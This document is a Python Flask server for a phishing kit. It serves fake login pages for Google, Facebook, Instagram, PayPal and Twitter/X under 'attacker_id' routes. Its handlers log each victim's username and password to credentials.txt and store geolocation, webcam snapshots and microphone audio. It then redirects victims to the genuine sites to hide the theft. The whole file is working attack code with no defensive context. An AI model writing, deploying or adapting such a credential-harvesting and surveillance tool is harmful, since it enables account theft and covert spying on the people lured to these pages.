from flask import Flask, request, render_template, redirect, url_for
import os
import base64
from datetime import datetime

app = Flask(__name__)


for folder in ["static/snapshots", "static/audio"]:
    if not os.path.exists(folder):
        os.makedirs(folder)


def save_data(platform, username, password, latitude=None, longitude=None, snapshot=None, audio=None):
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    with open("credentials.txt", "a") as f:
        f.write(f"[{timestamp}] Platform: {platform}, Username: {username}, Password: {password}, "
                f"Lat: {latitude or 'N/A'}, Lon: {longitude or 'N/A'}\n")
    if snapshot:
        snapshot_filename = f"static/snapshots/{timestamp}.png"
        with open(snapshot_filename, "wb") as img_file:
            img_file.write(base64.b64decode(snapshot.split(',')[1]))
    if audio:
        audio_filename = f"static/audio/{timestamp}.webm"
        with open(audio_filename, "wb") as audio_file:
            audio_file.write(base64.b64decode(audio.split(',')[1]))


@app.route('/')
def index():
    return render_template('index.html')


@app.route('/google-login/<attacker_id>')
def google_login(attacker_id):
    return render_template('google.html', attacker_id=attacker_id)


@app.route('/facebook-login/<attacker_id>')
def facebook_login(attacker_id):
    return render_template('facebook.html', attacker_id=attacker_id)


@app.route('/instagram-login/<attacker_id>')
def instagram_login(attacker_id):
    return render_template('instagram.html', attacker_id=attacker_id)


@app.route('/paypal-login/<attacker_id>')
def paypal_login(attacker_id):
    return render_template('paypal.html', attacker_id=attacker_id)


@app.route('/twitter-login/<attacker_id>')
def twitter_login(attacker_id):
    return render_template('twitter-x.com.html', attacker_id=attacker_id)


@app.route('/submit', methods=['POST'])
def submit():
    platform = request.form['platform']
    username = request.form['username']
    password = request.form['password']
    latitude = request.form.get('latitude')
    longitude = request.form.get('longitude')
    snapshot = request.form.get('snapshot')
    audio = request.form.get('audio')

    save_data(platform, username, password,
              latitude, longitude, snapshot, audio)

    if platform == "Google":
        return redirect("https://accounts.google.com")
    elif platform == "Facebook":
        return redirect("https://facebook.com")
    elif platform == "Instagram":
        return redirect("https://www.instagram.com/accounts/login/?hl=en")
    elif platform == "Paypal":
        return redirect("https://www.paypal.com/in/signin")
    elif platform == "Twitter-x":
        return redirect("https://x.com/i/flow/login")
    elif platform == "Github":
        return redirect("https://github.com/login")
    return "Success"


# hardwareaccess


@app.route('/MicrophoneAccess-testing/<attacker_id>')
def microphone_access(attacker_id):
    return render_template('mic.html', attacker_id=attacker_id)


@app.route('/access', methods=['POST'])
def access():
    Access_Platform = request.form['Access_Platform']
    username = request.form['username']
    password = request.form['password']
    latitude = request.form.get('latitude')
    longitude = request.form.get('longitude')
    snapshot = request.form.get('snapshot')
    audio = request.form.get('audio')
    save_data(Access_Platform, username, password,
              latitude, longitude, snapshot, audio)
    return "Tested  Successfully"


if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=5000)
